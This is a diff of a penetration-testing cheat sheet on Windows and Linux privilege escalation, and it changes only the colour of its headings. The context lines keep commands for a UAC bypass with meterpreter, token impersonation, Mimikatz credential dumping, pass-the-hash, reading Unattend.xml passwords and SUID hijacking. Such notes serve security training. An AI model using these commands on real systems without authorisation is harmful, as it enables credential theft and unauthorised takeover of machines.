@@ -1,19 +1,19 @@
 # Privilege Escalation
 
-## <mark style="color:yellow;">Windows</mark>
+## <mark style="color:purple;">Windows</mark>
 
 {% hint style="info" %}
 **Note**: if you have a valid user credential you can authenticate in windows target from SMB, RDP, WinRM.
 {% endhint %}
 
-### <mark style="color:yellow;">Automation script</mark>
+### <mark style="color:purple;">Automation script</mark>
 
 ```batch
 :: https://github.com/itm4n/PrivescCheck
 powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
 ```
 
-### <mark style="color:yellow;">UAC Bypass</mark>
+### <mark style="color:purple;">UAC Bypass</mark>
 
 User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.
 
@@ -48,7 +48,7 @@ Akagi64.exe 23 <payload_full_path> # NOTE FULL PATH
 # Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
 ```
 
-### <mark style="color:yellow;">Impersonate Tokens</mark>
+### <mark style="color:purple;">Impersonate Tokens</mark>
 
 **Metasploit - incognito**
 
@@ -84,7 +84,7 @@ ps
 migrate 2948
 ```
 
-### <mark style="color:yellow;">Password in configuration file (Unattend.xml)</mark>
+### <mark style="color:purple;">Password in configuration file (Unattend.xml)</mark>
 
 An answer file is an XML-based file that contains setting definitions and values to use during Windows Setup. Answer files (or Unattend files) are used by Administrators when they are setting up fresh images as it allows for an automated setup for Windows systems.
 
@@ -98,7 +98,7 @@ C:\Windows\system32\sysprep\sysprep.xml
 
 Extract password and decode it (from base64)
 
-### <mark style="color:yellow;">Credential Dumping (Mimikatz - Kiwi - Hashdump)</mark>
+### <mark style="color:purple;">Credential Dumping (Mimikatz - Kiwi - Hashdump)</mark>
 
 Prerequisites: User must be a member a local Administrators.
 
@@ -145,7 +145,7 @@ lsadump::sam
 sekurlsa::logonpasswords  
 ```
 
-### <mark style="color:yellow;">Pass the Hash</mark>
+### <mark style="color:purple;">Pass the Hash</mark>
 
 ```sh
 # 1. Method
@@ -163,7 +163,7 @@ set SMBPass <LM hash>:<NTLM hash>
 * With `hashdump` you have the right format
 {% endhint %}
 
-### <mark style="color:yellow;">Other</mark>
+### <mark style="color:purple;">Other</mark>
 
 * Powershell History
 * Saved Windows Credentials
@@ -176,9 +176,9 @@ set SMBPass <LM hash>:<NTLM hash>
 * Windows Privileges
 * Unpatched Software
 
-## <mark style="color:yellow;">Linux</mark>
+## <mark style="color:purple;">Linux</mark>
 
-### <mark style="color:yellow;">Vulnerable program</mark>
+### <mark style="color:purple;">Vulnerable program</mark>
 
 Search scripts that execute programs or programs. Search for any vulnerable version. One example: chkrootkit v0.49 (running as root)
 
@@ -186,19 +186,19 @@ Search scripts that execute programs or programs. Search for any vulnerable vers
 ps aux
 ```
 
-### <mark style="color:yellow;">Weak Permissions</mark>
+### <mark style="color:purple;">Weak Permissions</mark>
 
 <pre class="language-sh"><code class="lang-sh"><strong># World-writable files - Ex: maybe you can edit shadow file
 </strong><strong>find / -not -type l -perm -o+w
 </strong></code></pre>
 
-### <mark style="color:yellow;">Sudo</mark>
+### <mark style="color:purple;">Sudo</mark>
 
 <pre class="language-sh"><code class="lang-sh">sudo -l
 <strong># Search on https://gtfobins.github.io/ how to exploit
 </strong></code></pre>
 
-### <mark style="color:yellow;">SUID - custom binary</mark>
+### <mark style="color:purple;">SUID - custom binary</mark>
 
 Premise: you have `binary_name` (with suid) that use/load/execute `loaded_binary`
 
@@ -235,7 +235,7 @@ gcc binary.c -o <loaded_binary>
 ./binary_name
 ```
 
-### <mark style="color:yellow;">Other</mark>
+### <mark style="color:purple;">Other</mark>
 
 * `sudo -l`
   * setenv?
